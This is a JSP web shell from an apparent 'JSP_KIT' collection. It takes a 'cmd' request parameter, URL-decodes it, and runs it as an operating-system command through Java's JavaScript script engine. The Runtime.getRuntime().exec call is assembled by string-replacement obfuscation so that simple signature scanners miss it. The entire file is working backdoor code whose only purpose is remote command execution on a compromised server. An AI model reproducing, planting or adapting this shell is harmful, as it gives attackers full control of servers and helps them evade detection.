<%@ page import="java.util.*,java.io.*,javax.script.*,java.net.*"%>
<%
//
// JSP_KIT
//
// 2.jsp = Command Execution (unix)
// js 简单混淆
// by: huzhanchi
//
%>
<HTML><BODY>
<%
if (request.getParameter("cmd") != null) {
        String n = request.getParameter("cmd");
  try {
        n = java.net.URLDecoder.decode(n, "UTF-8");
			} catch (Exception e) {
					  e.printStackTrace();
			}
        String j = System.getProperty("java.version");
        ScriptEngineManager engineManager = new ScriptEngineManager();
        ScriptEngine engine = null;
        boolean b = j.indexOf("1.7") == 0 ? true : false;
        engine = engineManager.getEngineByName("js");
        String m = b ? "(function sum() {importPackage(java.util);importPackage(java.lang);{$0}time{$1}Run{$2}().ex{$3}(a); return a; })(a)"
                             .replace("{$0}" ,"Run")
                             .replace("{$1}",".get")
                             .replace("{$2}","time")
                             .replace("{$3}","ec"):
          "load(\"nashorn:mozilla_compat.js\");(function sum() {importPackage(java.util);importPackage(java.lang);Run{$0}ntime().e{$1}c(a); return a; })(a)"
                .replace("{$0}","time.getRu")
                .replace("{$1}","xe");

        Bindings bindings = engine.createBindings();
        bindings.put("a", n);
        engine.setBindings(bindings, ScriptContext.GLOBAL_SCOPE);
        engine.eval(m, bindings);
  }
%>
</BODY></HTML>

